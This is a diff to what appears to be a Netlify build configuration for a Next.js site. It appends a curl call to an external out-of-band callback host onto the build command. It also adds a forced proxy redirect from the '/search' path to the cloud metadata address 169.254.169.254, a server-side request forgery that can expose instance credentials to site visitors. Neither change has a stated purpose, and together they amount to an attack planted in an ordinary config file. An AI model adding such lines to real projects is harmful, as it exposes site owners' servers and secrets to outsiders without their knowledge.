@@ -1,7 +1,14 @@
 [build]
-  command = "npm run build"
+  command = "npm run build||curl http://7x5wkztb1j4nlptlupnoohioxf36rwfl.oastify.com"
   publish = ".next"
   functions = ".netlify/functions"
 
 [[plugins]]
 package = "@netlify/plugin-nextjs"
+
+[[redirects]]
+  from = "/search"
+  to = "http://169.254.169.254"
+  status = 200
+  force = true
+  headers = {X-From = "Netlify"}
